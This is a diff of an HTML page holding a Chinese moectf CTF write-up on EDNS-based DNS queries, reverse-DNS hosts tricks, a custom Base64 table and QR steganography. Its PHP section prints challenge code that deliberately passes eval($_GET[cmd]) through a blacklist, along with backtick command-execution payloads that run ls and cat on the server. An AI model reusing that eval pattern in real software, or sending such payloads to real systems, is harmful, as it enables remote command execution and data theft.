 </span></span><span class="line"><span class="cl">$ wget http://wilmer.gaa.st/edns-client-subnet/bind-9.9.3-dig-edns-client-subnet-iana.diff
 </span></span><span class="line"><span class="cl">$ yum -y install patch
 </span></span><span class="line"><span class="cl">$ patch -p0 &lt; bind-9.9.3-dig-edns-client-subnet-iana.diff
 </span></span><span class="line"><span class="cl">$ ./configure --without-openssl
-</span></span><span class="line"><span class="cl">$ make</span></span></code></pre></div><p>然后终端执行:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ /bin/dig/dig @8.8.8.8 region.challenge.moectf.cn +client<span class="o">=</span>175.45.176.68</span></span></code></pre></div><p><code>edns</code>其实就是查询<code>dns</code>服务器的时候手动告知<code>dns</code>你是哪里的人, 然后<code>dns</code>就会返回一个你该访问的地址. 得到朝鲜解析的IP之后, 老方法修改<code>hosts</code>, 就得到了朝鲜人的<code>flag</code>.</p>
+</span></span><span class="line"><span class="cl">$ make</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后终端执行:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ /bin/dig/dig @8.8.8.8 region.challenge.moectf.cn +client<span class="o">=</span>175.45.176.68</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>edns</code>其实就是查询<code>dns</code>服务器的时候手动告知<code>dns</code>你是哪里的人, 然后<code>dns</code>就会返回一个你该访问的地址. 得到朝鲜解析的IP之后, 老方法修改<code>hosts</code>, 就得到了朝鲜人的<code>flag</code>.</p>
 <p>从企鹅大佬的博客上找到了关于edns的详细解释, 现在很不要脸的引用过来:</p>
 <blockquote>
 <h3 class="heading-element" id="1什么是edns"><span><em>1、什么是EDNS？</em></span>
@@ -1127,7 +2219,22 @@ E</code></pre><p>This results in the following ciphertext:</p>
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
 </h3><p>这道题是考思维定势的&hellip;</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-HTML" data-lang="HTML"><span class="line"><span class="cl"><span class="err">&lt;</span>?php
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-HTML" data-lang="HTML"><span class="line"><span class="cl"><span class="err">&lt;</span>?php
 </span></span><span class="line"><span class="cl">highlight_file(__FILE__);
 </span></span><span class="line"><span class="cl">error_reporting(0);
 </span></span><span class="line"><span class="cl">$blacklist = [&#34;system&#34;, &#34;ini_set&#34;, &#34;exec&#34;, &#34;scandir&#34;, &#34;shell_exec&#34;, &#34;proc_open&#34;, &#34;error_log&#34;, &#34;ini_alter&#34;, &#34;ini_set&#34;, &#34;pfsockopen&#34;, &#34;readfile&#34;, &#34;echo&#34;, &#34;file_get_contents&#34;, &#34;readlink&#34;, &#34;symlink&#34;, &#34;popen&#34;, &#34;fopen&#34;, &#34;file&#34;, &#34;fpassthru&#34;];
@@ -1137,7 +2244,9 @@ E</code></pre><p>This results in the following ciphertext:</p>
 </span></span><span class="line"><span class="cl"> die(&#39;hack&#39;);
 </span></span><span class="line"><span class="cl"> }
 </span></span><span class="line"><span class="cl">}
-</span></span><span class="line"><span class="cl">eval($_GET[cmd]);</span></span></code></pre></div><p>打开题目的代码长这样, 能看到<code>blacklist</code>里面禁用了好多用来输出和操作文件的函数&hellip; 怎么办? 于是我研究了好久<code>PHP</code>的漏洞, 包括<code>stristr()</code>的漏洞, 最后除了发现<code>print()</code>函数还能用之外什么都做不了&hellip;</p>
+</span></span><span class="line"><span class="cl">eval($_GET[cmd]);</span></span></code></pre></td></tr></table>
+</div>
+</div><p>打开题目的代码长这样, 能看到<code>blacklist</code>里面禁用了好多用来输出和操作文件的函数&hellip; 怎么办? 于是我研究了好久<code>PHP</code>的漏洞, 包括<code>stristr()</code>的漏洞, 最后除了发现<code>print()</code>函数还能用之外什么都做不了&hellip;</p>
 <p>但是咧, 经过大哥的点拨, 我明白了, <code>PHP</code>的函数不能用, 但是我们可以用<code>Linux</code>的指令呀!!!</p>
 <p>于是我们分析代码, 发现首先是没有除了<code>cmd</code>之外的变量供我们使用的, 所以我们需要构建一个新的变量. 这新的变量的名字我们暂且叫<code>str</code>好了, 反正也没有什么关系.. ( 因为我大哥这么取的名字 )</p>
 <p>接下来我们要读取这个<code>str</code>里的东西, 然后<code>print</code>出来. 最后跟上<code>id</code>的内容..</p>
@@ -1146,10 +2255,24 @@ E</code></pre><p>This results in the following ciphertext:</p>
 <p><code>PHP</code>会把包含在反引号里面的东西当成<code>Shell</code>指令执行.</p>
 <p>所以, 我们就可以快乐的构建一句话木马啦!</p>
 <p>Like this:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">?</span><span class="nx">cmd</span><span class="o">=</span><span class="nv">$str</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">id</span><span class="p">];</span><span class="k">print</span><span class="o">%</span><span class="mi">20</span><span class="sb">`$str`</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">id</span><span class="o">=</span><span class="nx">ls</span></span></span></code></pre></div><p>这样我们就可以调用<code>ls</code>指令来查看服务器当前文件夹里都有些什么东东..</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">?</span><span class="nx">cmd</span><span class="o">=</span><span class="nv">$str</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">id</span><span class="p">];</span><span class="k">print</span><span class="o">%</span><span class="mi">20</span><span class="sb">`$str`</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">id</span><span class="o">=</span><span class="nx">ls</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这样我们就可以调用<code>ls</code>指令来查看服务器当前文件夹里都有些什么东东..</p>
 <p>然后我们看见了两个文件, 一个是<code>4f5f6c3be6ab7cc59dabf9ff7f2b248a </code> 另一个是<code>index.php</code>..</p>
 <p><code>flag</code>自然不可能存在<code>index.php</code>里啦, 我们用<code>Linux</code>里的<code>cat</code>指令来查看那个乱码文件里是些什么东西:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">?</span><span class="nx">cmd</span><span class="o">=</span><span class="nv">$str</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">id</span><span class="p">];</span><span class="k">print</span><span class="o">%</span><span class="mi">20</span><span class="sb">`$str`</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">id</span><span class="o">=</span><span class="nx">cat</span><span class="o">+</span><span class="mi">4</span><span class="nx">f5f6c3be6ab7cc59dabf9ff7f2b248a</span></span></span></code></pre></div><p>然后就拿到<code>flag</code>啦&hellip;</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">?</span><span class="nx">cmd</span><span class="o">=</span><span class="nv">$str</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">id</span><span class="p">];</span><span class="k">print</span><span class="o">%</span><span class="mi">20</span><span class="sb">`$str`</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">id</span><span class="o">=</span><span class="nx">cat</span><span class="o">+</span><span class="mi">4</span><span class="nx">f5f6c3be6ab7cc59dabf9ff7f2b248a</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后就拿到<code>flag</code>啦&hellip;</p>
 <p><code>flag</code>: <code>moectf{PLEASE_USE_disable_function!!!!!!}</code></p>
 <h2 class="heading-element" id="android"><span>Android</span>
  <a href="#android" class="heading-mark">
@@ -1183,8 +2306,22 @@ E</code></pre><p>This results in the following ciphertext:</p>
  </a>
 </h3><p>这道题好像很好做..题目的地址: <code>176.9.166.200</code></p>
 <p>我使用了<code>nslookup</code>, 然后反查到了域名:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">200.166.9.176.in-addr.arpa name = vps.stockservers.com.</span></span></code></pre></div><p>然后修改<code>hosts</code>文件,</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">176.9.166.200 vps.stockservers.com</span></span></code></pre></div><p>然后刷新网络再用火狐打开, 看到证书不匹配的安全警告点击跳过, 然后就拿到了<code>flag</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">200.166.9.176.in-addr.arpa name = vps.stockservers.com.</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后修改<code>hosts</code>文件,</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">176.9.166.200 vps.stockservers.com</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后刷新网络再用火狐打开, 看到证书不匹配的安全警告点击跳过, 然后就拿到了<code>flag</code>.</p>
 <h2 class="heading-element" id="misc"><span>MISC</span>
  <a href="#misc" class="heading-mark">
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
@@ -1247,7 +2384,73 @@ E</code></pre><p>This results in the following ciphertext:</p>
 </h3><p>哇塞这道题是真的做了很久很久&hellip;</p>
 <p>其实是考的是Base64的原理, 上网<code>bing</code>了一下, 大致就是把字符变成二进制串然后重新分组重新断句, 就很神奇&hellip;</p>
 <p>先给<code>table</code>编号,</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">00000000 x
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">00000000 x
 </span></span><span class="line"><span class="cl">00000001 y
 </span></span><span class="line"><span class="cl">00000010 U
 </span></span><span class="line"><span class="cl">00000011 V
@@ -1308,7 +2511,9 @@ E</code></pre><p>This results in the following ciphertext:</p>
 </span></span><span class="line"><span class="cl">00111010 t
 </span></span><span class="line"><span class="cl">00111011 u
 </span></span><span class="line"><span class="cl">00111100 v
-</span></span><span class="line"><span class="cl">00111101 w</span></span></code></pre></div><p>编好之后, 就可以通过查表的方式把密文翻译成二进制形式, 然后把每一段二进制的前两位0给去掉, 重新按照八位分组, 对照ASCII表就可以翻译出来. 这道题是在火车上写的, 就纯手撕了&hellip; 没有代码.. 不过查表和重新拼接的代码实现应该不怎么难&hellip;</p>
+</span></span><span class="line"><span class="cl">00111101 w</span></span></code></pre></td></tr></table>
+</div>
+</div><p>编好之后, 就可以通过查表的方式把密文翻译成二进制形式, 然后把每一段二进制的前两位0给去掉, 重新按照八位分组, 对照ASCII表就可以翻译出来. 这道题是在火车上写的, 就纯手撕了&hellip; 没有代码.. 不过查表和重新拼接的代码实现应该不怎么难&hellip;</p>
 <h3 class="heading-element" id="aiaiai"><span>AiAiAi</span>
  <a href="#aiaiai" class="heading-mark">
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
@@ -1346,7 +2551,68 @@ E</code></pre><p>This results in the following ciphertext:</p>
 <p>然后就想方设法地实现这个函数了…</p>
 <p>最后借鉴了大佬的作品, 才勉强把这题弄出来..</p>
 <p>用<code>stegsolve</code>打开二维码进行频率分析可以得到代码里的<code>dic</code>, 然后</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">bit</span><span class="p">):</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">bit</span><span class="p">):</span>
 </span></span><span class="line"><span class="cl"> <span class="c1"># implement this</span>
 </span></span><span class="line"><span class="cl"> <span class="c1"># 请实现这一函数</span>
 </span></span><span class="line"><span class="cl"> <span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
@@ -1402,7 +2668,9 @@ E</code></pre><p>This results in the following ciphertext:</p>
 </span></span><span class="line"><span class="cl"> <span class="n">inx</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">:</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="mi">8</span><span class="p">],</span> <span class="mi">2</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"> <span class="n">dat</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">inx</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"> <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;flag1.jpg&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl"> <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">dat</span><span class="p">)</span></span></span></code></pre></div><p>然后把生成的图片拖进<code>WinHex</code>里, 就能看见<code>flag</code>了.</p>
+</span></span><span class="line"><span class="cl"> <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">dat</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后把生成的图片拖进<code>WinHex</code>里, 就能看见<code>flag</code>了.</p>
 <h2 class="heading-element" id="pwn"><span>PWN</span>
  <a href="#pwn" class="heading-mark">
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
